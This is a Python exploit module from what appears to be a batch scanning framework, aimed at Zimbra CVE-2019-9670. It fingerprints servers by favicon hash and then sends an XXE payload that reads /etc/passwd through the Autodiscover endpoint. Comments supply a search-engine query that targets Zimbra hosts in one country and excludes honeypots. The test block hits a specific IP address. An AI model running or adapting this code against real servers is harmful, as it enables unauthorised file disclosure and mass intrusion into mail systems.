# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-09 2:18

import hashlib
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.request.asynchttp import *


# fofa: ("zimbra" && country="CN") && (is_honeypot=false && is_fraud=false)
# python batch.py -m exploit.web.Zimbra.CVE-2019-9670 -cs -fs "(\"zimbra\" && country=\"CN\") && (is_honeypot=false && is_fraud=false)"

class Script(BaseScript):
    name = 'Zimbra'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = 'CVE-2019-9670'
        # 来源
        self.refer = 'http://www.rapid7.com/db/modules/exploit/linux/http/zimbra_xxe_rce'
        # session
        self.session = session
        self.detectPathList = ['/zimbraAdmin/img/logo/favicon.ico']
        self.execPathList = ['/Autodiscover/Autodiscover.xml']
        self.favicon = ['8c7d1c14e4b9c42f07bd6b800d93b806']
        self.info = 'Version <= 8.7.0 and 8.7.11'

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        await asyncio.sleep(2)
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                tqdm.write(Fore.RED + '[{}] {}'.format('Zimbra Finger', url))
                                return {'name': 'Zimbra Finger', 'url': url, 'software': 'Zimbra'}
        except Exception:
            return None

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/xml'})
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                data = '''<!DOCTYPE xxe [
                    <!ELEMENT name ANY >
                    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
                     <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
                        <Request>
                          <EMailAddress>aaaaa</EMailAddress>
                          <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
                        </Request>
                      </Autodiscover>'''
                async with self.session.post(url=url, headers=headers, data=data, allow_redirects=False) as response:
                    if response is not None:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'Requested response schema not available' in text:
                            tqdm.write(Fore.RED + '[{}] {}'.format('Zimbra XXE', url))
                            return {'name': 'Zimbra XXE', 'url': url, 'software': 'Zimbra'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://18.163.47.9:8443/zimbraAdmin/img/logo/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    # sem = asyncio.Semaphore(500)
    # sc = Script('https://175.20.237.197:7071/zimbraAdmin/img/logo/favicon.ico', 1, sem)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack())
